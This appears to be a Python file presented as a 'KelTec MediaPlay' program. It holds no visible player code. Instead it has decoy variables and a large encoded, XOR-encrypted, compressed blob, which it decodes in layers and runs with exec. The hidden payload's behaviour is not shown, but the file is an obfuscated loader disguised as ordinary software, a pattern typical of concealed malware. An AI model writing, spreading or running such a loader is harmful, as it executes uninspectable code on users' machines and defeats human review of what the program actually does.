# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 577024 ^ 458086
_lx1_1 = len("519e38")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-257438)
_lx3_3 = 131098 * 0
_lx4_4 = 113387 ^ 756690
_K = 'e396d6d8aa1a8fef0db0767ccf5068d00930cb1fa6c2744bf901cf099636bd92'
_M = '0TGAHB60cHYp8A=='
_D = '=UiJDhsc/uMU/h/alueng1Wgw65B75mNOHzxm7vHJ07XApVwrKZ8Zey7zxtJdMFH5WDciEXDgMVbcFltJlBOlc7CPeH0L/HfQ7N8+zJogLCtqbMwRmLxPlPRegqI88ru8uKYq00FD7/tZ8aqz4Ms35iVIj0CGOzcCzMaF6peZWAIVTDGJBt3sc+bf4Gq92d/zzTT2WaxGnV6yP08IuFiLmd787PDEAvZGoKXaghwT/NteV3vvkNwlCdfpO65W1huah0kke4/mzad3NDVM1/VxsccI3uSQx4i8Gp5xx+sH0Yi8Y+CCzXo0kmZF3yJgR9D9E4v9yAIJOtQ0WnZ2zjqIgwkeX98xwkRrnOjvyNTYftBbX944hafcv7/wdtDbr2SHy3SvPqB5hKzUOh0+HsWtAYPeJOrpO+DEDYpYVGyDWeRpcsizJ57J1HtFwP5ss6goUTj+M57b/g8gyu1qbavhZaoZiB++R5ptAjIpQ7GOxfwg1+UCUeqw9dXsrKLmyu/AerX0fu4v4z/nulkPiA/xk8Ps3QjvZN7KB87PxINTRucHiHp4nvrggyHAT1+KCSiblNmDag2ea2dLExZ8/Oltjx0Kmp6dqnE3S4GMApfBCrzY1IlMjFBuEvTV40IgLsADBrskkdsoiVQvlXezHqwT2ZqgwJCPMnLVlehSmKe3uGQILLTus8aDmR79BYQ9ZxMgo5aClJbk5wC2+Um2qPwLYwfcFaya4seGyP8pGyo7oNm5E0oYMcXKVg5dt89+c29ZcLp1f3m7/KwWOyZEHZ+DnMiIgalTFYCM49omRJifyiwsAtDoPXosApzoaCApLjrvQ+7Lct4bbTdYwo/ROQ+PlMxcYs4uoNAFJz1fydcHL1YyODoPtnUX/GiPGoWmS12pp15rLEKwuGkysQbqNEWl4t5Djt6ldoZIO+a59iu+mQmBbR1DxDXuqCzKEjvIL+wzYWT2yLxxX3I59+zq7IFcDfbR6miUzWRDYCMcTzs2uQOG4deFtUo+6Tjxn4bLU1dpBCX5BNyB2Ui5tj6YC3ujvReJzUBYVE4+EKZENAfX7IwNa0KVzQ34m5PaBdsHlNE+U3/qgTazGUjrQIP77Jwrki3Qjbqd52NxeIXpZ5xOT8n1m32oVPbPiAX1LuV6EDOspJdPh8MZZMJG8ZUe4a/wfwTiMl7Bp5MnVsrjCPwcTmJe4AYo9APOjBqPMmbSQPLJHNXIgUwtE0rPkD8aQqGuDHACat2ziNtdOoTjtsw8O2nAR9d3USRGrCFDZkjDOv85aeOUBa21UvzPQINLYsnNvcB7eQz0t8xuoEdwYr8KskEwdYn677Mlq315cKDJVf+Si7o6Ee0vh3AEDiqrl1ZUMNYA8IJ9XZPS6hC6CeflGeggTDT9QRnFe2EW1HDcKsFy5qGGl33ZZIEueUj3z8wVoCUXb7mwXefds31uBclO9bLPgK8QWQNqnhRjLxHTK2hx6TCPiWFsF//uwORn05x1vuH8PuCaQdziItbEkZ0A7ZFBK1UmWY4KgsS21+F1iKzpX+AQ5soy2pI2biEswXBmXUh279ZGGXi3zjyxXRk+RSjzHxZFHitMvqMsFMhsxcUAIFRhYZPq7YmH53njT8YwXtM94a/3d8hjq9j4OnHUtMvCi3BEPSrojk8LUdNVFQFNQDzbew4Hq1jxWrKrYnK/vxNYiu/VLtUXt20ey+acT+mNxzHZPqasUP6cQ9wiWSWDJAcup2tJktsUQ4825xVbRlGn8rRtRnm8yUYro8wC9KGdMqwcV4lCZx3ppy/WSgs67iXSXOzmDYdhVj8TWrcn2tsbLOfkVnatX7BU3KxXZ1fvI+/'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
